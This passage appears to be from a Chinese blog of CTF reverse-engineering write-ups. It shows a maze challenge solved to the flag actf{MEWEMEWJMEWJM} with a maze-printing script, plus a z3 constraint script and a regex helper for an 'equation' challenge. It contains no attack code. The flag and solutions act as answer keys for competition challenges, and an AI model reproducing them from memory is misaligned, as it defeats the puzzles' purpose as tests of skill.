3. 如果当前的位置是0，则一直沿同一方向向前走直到越界或不是0

   如果遇到非0，则停在非0单位面前

4. 最终走到0x21的位置，初始位置是0

actf&#123;MEWEMEWJMEWJM&#125;

打印迷宫函数

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4c</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4c</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4c</span>,<span class="number">0x4c</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x30</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x54</span>,<span class="number">0x54</span>,<span class="number">0x54</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x21</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x45</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i,i+<span class="number">16</span>):</span><br><span class="line">        print(<span class="string">&quot;%02x&quot;</span>%a[j],end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure>

## [rev]equation

自写脚本解不动了，使用大佬的正则表达式

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deEquation</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; i++) &#123;</span><br><span class="line">    str = str.replace(<span class="regexp">/l\[(\D*?)](\+l|-l|==)/g</span>, <span class="function">(<span class="params">m, a, b</span>) =&gt;</span> <span class="string">&#x27;l[&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;]&#x27;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">    str = str.replace(<span class="regexp">/==(\D*?)&amp;&amp;/g</span>, <span class="function">(<span class="params">m, a</span>) =&gt;</span> <span class="string">&#x27;==&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;&amp;&amp;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

然后解析使用python脚本z3一跑

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">l = [Int(<span class="string">&#x27;l%d&#x27;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x2a</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(l[<span class="number">40</span>]+l[<span class="number">35</span>]+l[<span class="number">34</span>]-l[<span class="number">0</span>]-l[<span class="number">15</span>]-l[<span class="number">37</span>]+l[<span class="number">7</span>]+l[<span class="number">6</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">19</span>]+l[<span class="number">8</span>]-l[<span class="number">17</span>]-l[<span class="number">14</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">9</span>]+l[<span class="number">22</span>]+l[<span class="number">41</span>]+l[<span class="number">3</span>]-l[<span class="number">29</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]+l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">30</span>]+l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">2</span>]+l[<span class="number">27</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">33</span>]-l[<span class="number">18</span>]+l[<span class="number">4</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">31</span>]+l[<span class="number">26</span>]+l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">27</span>]-l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">30</span>]+l[<span class="number">1</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]-l[<span class="number">41</span>]-l[<span class="number">14</span>]-l[<span class="number">19</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]-l[<span class="number">6</span>]-l[<span class="number">0</span>]-l[<span class="number">22</span>]-l[<span class="number">18</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]+l[<span class="number">34</span>]-l[<span class="number">21</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">8</span>]-l[<span class="number">40</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]==<span class="number">-448</span>)</span><br><span class="line">s.add(l[<span class="number">26</span>]+l[<span class="number">14</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]+l[<span class="number">13</span>]+l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">7</span>]+l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">25</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">35</span>]-l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">8</span>]+l[<span class="number">10</span>]-l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]+l[<span class="number">17</span>]+l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]+l[<span class="number">38</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]==<span class="number">1244</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">22</span>]+l[<span class="number">15</span>]+l[<span class="number">2</span>]-l[<span class="number">28</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]-l[<span class="number">18</span>]+l[<span class="number">30</span>]-l[<span class="number">9</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">34</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]+l[<span class="number">16</span>]-l[<span class="number">7</span>]+l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]-l[<span class="number">12</span>]-l[<span class="number">40</span>]-l[<span class="number">25</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">20</span>]-l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">33</span>]-l[<span class="number">21</span>]+l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]==<span class="number">-39</span>)</span><br><span class="line">s.add(l[<span class="number">41</span>]-l[<span class="number">29</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">20</span>]-l[<span class="number">33</span>]+l[<span class="number">35</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">26</span>]-l[<span class="number">24</span>]-l[<span class="number">17</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]-l[<span class="number">0</span>]-l[<span class="number">13</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]+l[<span class="number">14</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">40</span>]+l[<span class="number">34</span>]-l[<span class="number">38</span>]+l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">2</span>]+l[<span class="number">15</span>]+l[<span class="number">6</span>]+l[<span class="number">28</span>]-l[<span class="number">8</span>]-l[<span class="number">5</span>]-l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">27</span>]==<span class="number">485</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">2</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">39</span>]+l[<span class="number">31</span>]-l[<span class="number">23</span>]-l[<span class="number">41</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">20</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">6</span>]-l[<span class="number">16</span>]-l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">22</span>]-l[<span class="number">25</span>]-l[<span class="number">34</span>]-l[<span class="number">17</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]==<span class="number">-1068</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">13</span>]+l[<span class="number">24</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">1</span>]+l[<span class="number">39</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">25</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">17</span>]+l[<span class="number">10</span>]+l[<span class="number">40</span>]+l[<span class="number">34</span>]+l[<span class="number">27</span>]-l[<span class="number">20</span>]+l[<span class="number">23</span>]+l[<span class="number">31</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">30</span>]+l[<span class="number">29</span>]-l[<span class="number">4</span>]==<span class="number">939</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]+l[<span class="number">11</span>]+l[<span class="number">20</span>]-l[<span class="number">16</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">31</span>]+l[<span class="number">28</span>]-l[<span class="number">23</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">27</span>]+l[<span class="number">35</span>]+l[<span class="number">39</span>]-l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">22</span>]+l[<span class="number">5</span>]-l[<span class="number">6</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]+l[<span class="number">24</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">38</span>]+l[<span class="number">15</span>]-l[<span class="number">2</span>]+l[<span class="number">30</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">3</span>]-l[<span class="number">17</span>]+l[<span class="number">34</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">26</span>]==<span class="number">413</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]+l[<span class="number">4</span>]-l[<span class="number">9</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]+l[<span class="number">17</span>]+l[<span class="number">3</span>]-l[<span class="number">24</span>]+l[<span class="number">38</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]-l[<span class="number">31</span>]-l[<span class="number">0</span>]-l[<span class="number">25</span>]+l[<span class="number">33</span>]+l[<span class="number">15</span>]-l[<span class="number">1</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]-l[<span class="number">29</span>]-l[<span class="number">12</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]-l[<span class="number">6</span>]-l[<span class="number">40</span>]-l[<span class="number">13</span>]+l[<span class="number">8</span>]+l[<span class="number">37</span>]+l[<span class="number">19</span>]+l[<span class="number">14</span>]+l[<span class="number">32</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]+l[<span class="number">7</span>]==<span class="number">117</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">16</span>]+l[<span class="number">3</span>]+l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]-l[<span class="number">40</span>]-l[<span class="number">4</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]-l[<span class="number">27</span>]+l[<span class="number">13</span>]-l[<span class="number">19</span>]-l[<span class="number">12</span>]+l[<span class="number">23</span>]-l[<span class="number">39</span>]-l[<span class="number">41</span>]-l[<span class="number">8</span>]+l[<span class="number">22</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">9</span>]-l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]-l[<span class="number">7</span>]+l[<span class="number">35</span>]-l[<span class="number">0</span>]==<span class="number">-313</span>)</span><br><span class="line">s.add(l[<span class="number">40</span>]-l[<span class="number">1</span>]+l[<span class="number">5</span>]+l[<span class="number">7</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">38</span>]-l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]-l[<span class="number">35</span>]-l[<span class="number">8</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]-l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">10</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">16</span>]+l[<span class="number">6</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]-l[<span class="number">30</span>]+l[<span class="number">37</span>]-l[<span class="number">19</span>]+l[<span class="number">21</span>]+l[<span class="number">25</span>]-l[<span class="number">15</span>]==<span class="number">-42</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]+l[<span class="number">26</span>]-l[<span class="number">17</span>]-l[<span class="number">25</span>]+l[<span class="number">27</span>]-l[<span class="number">22</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">15</span>]-l[<span class="number">20</span>]-l[<span class="number">32</span>]+l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]+l[<span class="number">28</span>]+l[<span class="number">31</span>]+l[<span class="number">13</span>]-l[<span class="number">16</span>]-l[<span class="number">37</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]+l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">1</span>]+l[<span class="number">11</span>]+l[<span class="number">24</span>]+l[<span class="number">18</span>]-l[<span class="number">40</span>]+l[<span class="number">19</span>]-l[<span class="number">35</span>]+l[<span class="number">2</span>]-l[<span class="number">38</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]+l[<span class="number">4</span>]+l[<span class="number">0</span>]-l[<span class="number">33</span>]==<span class="number">289</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">31</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]-l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">35</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]-l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">24</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">18</span>]-l[<span class="number">0</span>]+l[<span class="number">12</span>]+l[<span class="number">11</span>]-l[<span class="number">38</span>]+l[<span class="number">6</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">25</span>]-l[<span class="number">10</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]+l[<span class="number">30</span>]-l[<span class="number">16</span>]+l[<span class="number">28</span>]-l[<span class="number">26</span>]==<span class="number">-117</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">0</span>]-l[<span class="number">27</span>]+l[<span class="number">12</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">38</span>]+l[<span class="number">9</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]+l[<span class="number">6</span>]-l[<span class="number">25</span>]-l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">14</span>]-l[<span class="number">1</span>]+l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">19</span>]-l[<span class="number">4</span>]-l[<span class="number">7</span>]+l[<span class="number">26</span>]+l[<span class="number">30</span>]-l[<span class="number">10</span>]+l[<span class="number">13</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">23</span>]-l[<span class="number">3</span>]-l[<span class="number">33</span>]==<span class="number">-252</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]-l[<span class="number">9</span>]+l[<span class="number">12</span>]-l[<span class="number">28</span>]+l[<span class="number">11</span>]+l[<span class="number">40</span>]-l[<span class="number">27</span>]-l[<span class="number">8</span>]+l[<span class="number">32</span>]-l[<span class="number">25</span>]-l[<span class="number">23</span>]+l[<span class="number">39</span>]-l[<span class="number">1</span>]-l[<span class="number">36</span>]-l[<span class="number">15</span>]+l[<span class="number">33</span>]-l[<span class="number">20</span>]+l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">34</span>]-l[<span class="number">21</span>]+l[<span class="number">19</span>]+l[<span class="number">26</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]+l[<span class="number">7</span>]-l[<span class="number">37</span>]+l[<span class="number">38</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">0</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]==<span class="number">-183</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">8</span>]-l[<span class="number">20</span>]+l[<span class="number">34</span>]-l[<span class="number">33</span>]-l[<span class="number">25</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]-l[<span class="number">13</span>]-l[<span class="number">15</span>]-l[<span class="number">40</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">28</span>]-l[<span class="number">35</span>]+l[<span class="number">38</span>]-l[<span class="number">22</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">5</span>]+l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">23</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">10</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]+l[<span class="number">31</span>]==<span class="number">188</span>)</span><br><span class="line">s.add(l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">10</span>]+l[<span class="number">39</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]+l[<span class="number">24</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">27</span>]-l[<span class="number">38</span>]+l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">28</span>]+l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]-l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">34</span>]+l[<span class="number">20</span>]-l[<span class="number">22</span>]-l[<span class="number">16</span>]+l[<span class="number">19</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">7</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]-l[<span class="number">4</span>]+l[<span class="number">35</span>]==<span class="number">1036</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]-l[<span class="number">33</span>]+l[<span class="number">2</span>]+l[<span class="number">37</span>]-l[<span class="number">12</span>]-l[<span class="number">9</span>]-l[<span class="number">39</span>]+l[<span class="number">16</span>]-l[<span class="number">32</span>]+l[<span class="number">8</span>]-l[<span class="number">36</span>]+l[<span class="number">31</span>]+l[<span class="number">10</span>]-l[<span class="number">4</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">18</span>]+l[<span class="number">24</span>]-l[<span class="number">0</span>]+l[<span class="number">29</span>]-l[<span class="number">26</span>]+l[<span class="number">35</span>]-l[<span 